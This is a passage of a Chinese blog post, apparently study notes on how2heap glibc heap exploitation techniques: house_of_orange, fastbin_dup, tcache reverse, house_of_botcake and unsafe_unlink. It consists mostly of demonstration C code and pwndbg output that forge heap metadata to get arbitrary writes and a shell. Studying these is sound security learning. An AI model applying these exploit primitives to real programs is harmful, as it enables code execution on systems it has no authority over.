0x405ff0Size: 0x10 (with flag bits: 0x11)Allocated chunkAddr: 0x406000Size: 0x00 (with flag bits: 0x00)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; x&#x2F;gx 0x7ffff7dd1b78 + 0x9a80x7ffff7dd2520 &lt;_IO_list_all&gt;:0x00007ffff7dd2540<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来将<code>top</code>地址赋值给<code>fp</code>后直接伪造<code>_IO_list_all</code>中的内容来满足检查，并在<code>top chunk</code>中存<code>/bin/sh</code>，改<code>__overflow</code>地址为<code>winner</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">memcpy( ( char *) top, &quot;&#x2F;bin&#x2F;sh\x00&quot;, 8);top[1] &#x3D; 0x61;FILE *fp &#x3D; (FILE *) top;fp-&gt;_mode &#x3D; 0; fp-&gt;_IO_write_base &#x3D; (char *) 2; fp-&gt;_IO_write_ptr &#x3D; (char *) 3; size_t *jump_table &#x3D; &amp;top[12];&#x2F;&#x2F;取一个地址为vtablejump_table[3] &#x3D; (size_t) &amp;winner;&#x2F;&#x2F;__overflow在跳表中的&#96;index&#96;是3*(size_t *) ((size_t) fp + sizeof(FILE)) &#x3D; (size_t) jump_table; &#x2F;&#x2F;在fp最后设置vtable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; x&#x2F;20gx 0x00000000004054000x405400:0x0068732f6e69622f0x00000000000000610x405410:0x00007ffff7dd1b780x00007ffff7dd25100x405420:0x00000000000000020x00000000000000030x405430:0x00000000000000000x00000000000000000x405440:0x00000000000000000x00000000000000000x405450:0x00000000000000000x00000000000000000x405460:0x00000000000000000x00000000000000000x405470:0x00000000000000000x000000000040129b0x405480:0x00000000000000000x00000000000000000x405490:0x00000000000000000x0000000000000000pwndbg&gt; 0x4054a0:0x00000000000000000x00000000000000000x4054b0:0x00000000000000000x00000000000000000x4054c0:0x00000000000000000x00000000000000000x4054d0:0x00000000000000000x0000000000405460<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p jump_table$52 &#x3D; (size_t *) 0x405460<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p *fp$4 &#x3D; &#123;  _flags &#x3D; 1852400175,  _IO_read_ptr &#x3D; 0x61 &lt;error: Cannot access memory at address 0x61&gt;,  _IO_read_end &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt; &quot;\020pB&quot;,  _IO_read_base &#x3D; 0x7ffff7dd2510 &quot;&quot;,  _IO_write_base &#x3D; 0x2 &lt;error: Cannot access memory at address 0x2&gt;,  _IO_write_ptr &#x3D; 0x3 &lt;error: Cannot access memory at address 0x3&gt;,  _IO_write_end &#x3D; 0x0,  _IO_buf_base &#x3D; 0x0,  _IO_buf_end &#x3D; 0x0,  _IO_save_base &#x3D; 0x0,  _IO_backup_base &#x3D; 0x0,  _IO_save_end &#x3D; 0x0,  _markers &#x3D; 0x0,  _chain &#x3D; 0x0,  _fileno &#x3D; 0,  _flags2 &#x3D; 0,  _old_offset &#x3D; 4199067,  _cur_column &#x3D; 0,  _vtable_offset &#x3D; 0 &#39;\000&#39;,  _shortbuf &#x3D; &quot;&quot;,  _lock &#x3D; 0x0,  _offset &#x3D; 0,  _codecvt &#x3D; 0x0,  _wide_data &#x3D; 0x0,  _freeres_list &#x3D; 0x0,  _freeres_buf &#x3D; 0x0,  __pad5 &#x3D; 0,  _mode &#x3D; 0,  _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时<code>bin</code>中是存在问题的，如果创建堆就会报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; binfastbinsemptyunsortedbinall [corrupted]FD: 0x405400 —▸ 0x7ffff7dd1bc8 (main_arena+168) ◂— 0x405400BK: 0x7ffff7dd2510 ◂— 0x0smallbins0x60: 0x405400 —▸ 0x7ffff7dd1bc8 (main_arena+168) ◂— 0x405400largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后<code>malloc</code>来触发<code>abort</code>使得<code>_IO_list_all</code>变成我们伪造的内容</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; *** Error in &#96;&#x2F;home&#x2F;starrysky&#x2F;how2heap-master&#x2F;glibc_2.23&#x2F;house_of_orange&#39;: malloc(): memory corruption: 0x00007ffff7dd2520 ***35in ..&#x2F;sysdeps&#x2F;unix&#x2F;sysv&#x2F;linux&#x2F;libc_fatal.cLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">  0x7ffff7a847e0 &lt;__libc_message+704&gt;    cmp    rbx, r12  0x7ffff7a847e3 &lt;__libc_message+707&gt;    sete   sil  0x7ffff7a847e7 &lt;__libc_message+711&gt;    mov    edx, dword ptr [rbp - 0x84]  0x7ffff7a847ed &lt;__libc_message+717&gt;    mov    edi, r15d  0x7ffff7a847f0 &lt;__libc_message+720&gt;    call   backtrace_and_maps                &lt;backtrace_and_maps&gt;► 0x7ffff7a847f5 &lt;__libc_message+725&gt;    call   abort                &lt;abort&gt;  0x7ffff7a847fa                         nop    word ptr [rax + rax]  0x7ffff7a84800 &lt;__libc_fatal&gt;          push   rbx  0x7ffff7a84801 &lt;__libc_fatal+1&gt;        mov    rbx, rdi  0x7ffff7a84804 &lt;__libc_fatal+4&gt;        nop    dword ptr [rax]  0x7ffff7a84808 &lt;__libc_fatal+8&gt;        lea    rsi, [rip + 0x117bba]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行<code>winner</code>后成功<code>getshell</code></p><h2 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc_2.27"></a>glibc_2.27</h2><p><code>2.27</code>和<code>2.23</code>的主要区别就是引入了<code>tcache</code>,但同时也去掉了一些检测</p><h3 id="fastbin-dup-double-free"><a href="#fastbin-dup-double-free" class="headerlink" title="fastbin_dup(double free)"></a>fastbin_dup(double free)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;setbuf(stdout, NULL);void *ptrs[8];for (int i&#x3D;0; i&lt;8; i++) &#123;ptrs[i] &#x3D; malloc(8);&#125;for (int i&#x3D;0; i&lt;7; i++) &#123;free(ptrs[i]);&#125;int *a &#x3D; calloc(1, 8);int *b &#x3D; calloc(1, 8);int *c &#x3D; calloc(1, 8);free(a);free(b);free(a);a &#x3D; calloc(1, 8);b &#x3D; calloc(1, 8);c &#x3D; calloc(1, 8);assert(a &#x3D;&#x3D; c);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>填满<code>tcache</code>之后正常利用<code>double free</code></p><p>先创建7个堆并释放以填满<code>tcache</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x20 [  7]: 0x405360 —▸ 0x405340 —▸ 0x405320 —▸ 0x405300 —▸ 0x4052e0 —▸ 0x4052c0 —▸ 0x4052a0 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建三个堆，先释放前两个堆，再释放第一个堆，造成<code>double free</code>，<code>bin</code>中由第一个堆指向第二个堆再指向第一个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x20 [  7]: 0x405360 —▸ 0x405340 —▸ 0x405320 —▸ 0x405300 —▸ 0x4052e0 —▸ 0x4052c0 —▸ 0x4052a0 ◂— 0x0fastbins0x20: 0x405390 —▸ 0x4053b0 ◂— 0x4053900x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时创建三个堆，第一三个堆为同一个堆</p><h3 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;void *ptrs[7];for (int i&#x3D;0; i&lt;7; i++) &#123;ptrs[i] &#x3D; malloc(8);&#125;for (int i&#x3D;0; i&lt;7; i++) &#123;free(ptrs[i]);&#125;unsigned long long stack_var;int *a &#x3D; calloc(1,8);int *b &#x3D; calloc(1,8);int *c &#x3D; calloc(1,8);free(a);free(b);free(a);unsigned long long *d &#x3D; calloc(1,8);stack_var &#x3D; 0x20;*d &#x3D; (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));void *p &#x3D; calloc(1,8);assert(p &#x3D;&#x3D; 8+(char *)&amp;stack_var);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用<code>fastbin_dup</code>即<code>double free</code>，申请出第一个堆之后将<code>fd</code>位置改成栈上的地址，于是栈上地址就会出现在<code>bin</code>链中，就能被申请出来了</p><h3 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;const size_t allocsize &#x3D; 0x40;int main()&#123;  setbuf(stdout, NULL);  char* ptrs[14];  size_t i;  for (i &#x3D; 0; i &lt; 14; i++) &#123;    ptrs[i] &#x3D; malloc(allocsize);  &#125;  for (i &#x3D; 0; i &lt; 7; i++) &#123;    free(ptrs[i]);  &#125;  char* victim &#x3D; ptrs[7];   free(victim);  for (i &#x3D; 8; i &lt; 14; i++) &#123;    free(ptrs[i]);  &#125;  size_t stack_var[6];  memset(stack_var, 0xcd, sizeof(stack_var));  *(size_t**)victim &#x3D; &amp;stack_var[0];  for (i &#x3D; 0; i &lt; 7; i++) &#123;    ptrs[i] &#x3D; malloc(allocsize);  &#125;  for (i &#x3D; 0; i &lt; 6; i++) &#123;    printf(&quot;%p: %p\n&quot;, &amp;stack_var[i], (char*)stack_var[i]);  &#125;  malloc(allocsize);  for (i &#x3D; 0; i &lt; 6; i++) &#123;    printf(&quot;%p: %p\n&quot;, &amp;stack_var[i], (char*)stack_var[i]);  &#125;  char *q &#x3D; malloc(allocsize);  assert(q &#x3D;&#x3D; (char *)&amp;stack_var[2]);  return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>填满<code>tcache</code>之后填入<code>fastbin</code>并改<code>fd</code>为目的地址，再从<code>tcache</code>申请堆之后<code>fastbin</code>中的堆会落到<code>tcache</code>，顺延申请到目的地址</p><p>创建了<code>14</code>个堆之后全部释放</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x50 [  7]: 0x405440 —▸ 0x4053f0 —▸ 0x4053a0 —▸ 0x405350 —▸ 0x405300 —▸ 0x4052b0 —▸ 0x405260 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x405660 —▸ 0x405610 —▸ 0x4055c0 —▸ 0x405570 —▸ 0x405520 ◂— ...0x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将<code>fastbin</code>中第一个堆的<code>fd</code>改成目标地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Free chunk (tcache) | PREV_INUSEAddr: 0x405250Size: 0x51fd: 0x00Free chunk (tcache) | PREV_INUSEAddr: 0x4052a0Size: 0x51fd: 0x405260Free chunk (tcache) | PREV_INUSEAddr: 0x4052f0Size: 0x51fd: 0x4052b0Free chunk (tcache) | PREV_INUSEAddr: 0x405340Size: 0x51fd: 0x405300Free chunk (tcache) | PREV_INUSEAddr: 0x405390Size: 0x51fd: 0x405350Free chunk (tcache) | PREV_INUSEAddr: 0x4053e0Size: 0x51fd: 0x4053a0Free chunk (tcache) | PREV_INUSEAddr: 0x405430Size: 0x51fd: 0x4053f0Free chunk (fastbins) | PREV_INUSEAddr: 0x405480Size: 0x51fd: 0x7fffffffdc60&lt;-- target...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将<code>tachce</code>全部申请完再申请一次之后目的地址会出现在<code>tcache</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x50 [  7]: 0x7fffffffdc70 —▸ 0x405490 —▸ 0x4054e0 —▸ 0x405530 —▸ 0x405580 —▸ 0x4055d0 —▸ 0x405620 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0xcdcdcdcdcdcdcdcd0x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="house-of-botcake-double-free"><a href="#house-of-botcake-double-free" class="headerlink" title="house_of_botcake(double free)"></a>house_of_botcake(double free)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&#123;    setbuf(stdin, NULL);    setbuf(stdout, NULL);    intptr_t stack_var[4];    intptr_t *x[7];    for(int i&#x3D;0; i&lt;sizeof(x)&#x2F;sizeof(intptr_t*); i++)&#123;        x[i] &#x3D; malloc(0x100);    &#125;        intptr_t *prev &#x3D; malloc(0x100);    intptr_t *a &#x3D; malloc(0x100);    malloc(0x10);        for(int i&#x3D;0; i&lt;7; i++)&#123;        free(x[i]);    &#125;    free(a);    free(prev);        malloc(0x100);    free(a);        intptr_t *b &#x3D; malloc(0x120);    b[0x120&#x2F;8-2] &#x3D; (long)stack_var;        malloc(0x100);    intptr_t *c &#x3D; malloc(0x100);        assert(c&#x3D;&#x3D;stack_var);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用<code>double free</code>使得同一个堆同时出现在<code>tcache</code>和<code>unsorted bin</code>造成堆块重叠</p><p>创建7个堆填满<code>tcache</code>，两个堆用于填入<code>unsorted bin</code>，最后一个堆防止和<code>top chunk</code>合并</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405360Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405470Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405580Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405690Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x4057a0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x4058b0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x4059c0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405ad0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405be0Size: 0x21Top chunk | PREV_INUSEAddr: 0x405c00Size: 0x20401<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将所有堆释放以进入对应的<code>bin</code>，其中<code>unsorted bin</code>中的两个堆合并</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x110 [  7]: 0x4058c0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 —▸ 0x405260 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x4059c0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4059c0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个堆让<code>tcache</code>有一个空位</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x110 [  6]: 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 —▸ 0x405260 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x4059c0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4059c0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再次释放<code>unsorted bin</code>的第一个堆使其进入<code>tcache</code>，此时<code>tcache</code>和<code>unsorted bin</code>的第一个堆是同一个堆，造成了堆块重叠</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x110 [  7]: 0x405ae0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 —▸ 0x405260 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x4059c0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4059c0smallbinsemptylargebinsemptypwndbg&gt; x&#x2F;20gx 0x405ad00x405ad0:       0x0000000000000000      0x00000000000001110x405ae0:       0x00000000004057b0      0x00007ffff7dcfca00x405af0:       0x0000000000000000      0x00000000000000000x405b00:       0x0000000000000000      0x00000000000000000x405b10:       0x0000000000000000      0x00000000000000000x405b20:       0x0000000000000000      0x00000000000000000x405b30:       0x0000000000000000      0x00000000000000000x405b40:       0x0000000000000000      0x00000000000000000x405b50:       0x0000000000000000      0x00000000000000000x405b60:       0x0000000000000000      0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个比释放的堆大一点的堆，这个堆会从<code>unsorted bin</code>中切割，且和<code>tcache</code>中第一个地址相同</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Free chunk (tcache) | PREV_INUSEAddr: 0x405250Size: 0x111fd: 0x00Free chunk (tcache) | PREV_INUSEAddr: 0x405360Size: 0x111fd: 0x405260Free chunk (tcache) | PREV_INUSEAddr: 0x405470Size: 0x111fd: 0x405370Free chunk (tcache) | PREV_INUSEAddr: 0x405580Size: 0x111fd: 0x405480Free chunk (tcache) | PREV_INUSEAddr: 0x405690Size: 0x111fd: 0x405590Free chunk (tcache) | PREV_INUSEAddr: 0x4057a0Size: 0x111fd: 0x4056a0Allocated chunk | PREV_INUSEAddr: 0x4058b0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x4059c0Size: 0x131Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405af0Size: 0xf1fd: 0x7ffff7dcfca0bk: 0x7ffff7dcfca0Allocated chunkAddr: 0x405be0Size: 0x20Top chunk | PREV_INUSEAddr: 0x405c00Size: 0x20401<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改刚创建的堆的<code>fd</code>位置，此时<code>tcache</code>中的堆会被修改，实现任意地址写</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x110 [  7]: 0x405ae0 —▸ 0x7fffffffdcf0 —▸ 0x7fffffffdd58 —▸ 0x7fffffffde28 —▸ 0x7fffffffe1c1 ◂— &#39;&#x2F;home&#x2F;starrysky&#x2F;how2heap&#x2F;how2heap&#x2F;glibc_2.27&#x2F;house_of_botcake&#39;fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x405af0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x405af0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="unsafe-unlink-unlink"><a href="#unsafe-unlink-unlink" class="headerlink" title="unsafe_unlink(unlink)"></a>unsafe_unlink(unlink)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;uint64_t *chunk0_ptr;int main()&#123;setbuf(stdout, NULL);int malloc_size &#x3D; 0x420;int header_size &#x3D; 2;chunk0_ptr &#x3D; (uint64_t*) malloc(malloc_size);uint64_t *chunk1_ptr  &#x3D; (uint64_t*) malloc(malloc_size); chunk0_ptr[2] &#x3D; (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);chunk0_ptr[3] &#x3D; (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);uint64_t *chunk1_hdr &#x3D; chunk1_ptr - header_size;chunk1_hdr[0] &#x3D; malloc_size;chunk1_hdr[1] &amp;&#x3D; ~1;free(chunk1_ptr);char victim_string[8];strcpy(victim_string,&quot;Hello!~&quot;);chunk0_ptr[3] &#x3D; (uint64_t) victim_string;chunk0_ptr[0] &#x3D; 0x4141414142424242LL;assert(*(long *)victim_string &#x3D;&#x3D; 0x4141414142424242L);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>tcache</code>最大范围是<code>0x408</code>,超过这个范围的会被释放到<code>unsorted bin</code></p><p>创建属于<code>unsorted bin</code>的堆之后伪造一个堆绕过<code>unlink</code>的检查</p><p><code>unlink</code>相关检查</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* Take a chunk off a bin list *&#x2F;#define unlink(AV, P, BK, FD) &#123;                                               if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))            malloc_printerr (&quot;corrupted size vs. prev_size&quot;);                    FD &#x3D; P-&gt;fd;                                   BK &#x3D; P-&gt;bk;                                   if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                 malloc_printerr (&quot;corrupted double-linked list&quot;);                    else &#123;                                    FD-&gt;bk &#x3D; BK;                                   BK-&gt;fd &#x3D; FD;                                   if (!in_smallbin_range (chunksize_nomask (P))                          &amp;&amp; __builtin_expect (P-&gt;fd_nextsize !&#x3D; NULL, 0)) &#123;                 if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize !&#x3D; P, 0)             || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize !&#x3D; P, 0))             malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);               if (FD-&gt;fd_nextsize &#x3D;&#x3D; NULL) &#123;                                if (P-&gt;fd_nextsize &#x3D;&#x3D; P)                                    FD-&gt;fd_nextsize &#x3D; FD-&gt;bk_nextsize &#x3D; FD;                           else &#123;                                             FD-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize;                                  FD-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize;                                  P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; FD;                                  P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; FD;                                &#125;                                          &#125; else &#123;                                         P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize;                           P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize;                         &#125;                                         &#125;                                     &#125;                                  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>伪造堆需要绕过：<code>FD-&gt;bk = BK; BK-&gt;fd = FD;</code></p><p>伪造完成后改地址相邻的下一个堆的的<code>prve_size</code>为伪造的堆大小、<code>inuse</code>位为<code>0</code>再释放掉它即可向后合并取消连接<code>fake chunk</code></p><p>先创建两个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x431Allocated chunk | PREV_INUSEAddr: 0x405680Size: 0x431Top chunk | PREV_INUSEAddr: 0x405ab0Size: 0x20551<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在第一个堆伪造一个堆的<code>fd、bk</code>并把第二个堆<code>inuse</code>位和<code>prve_size</code>位改掉</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 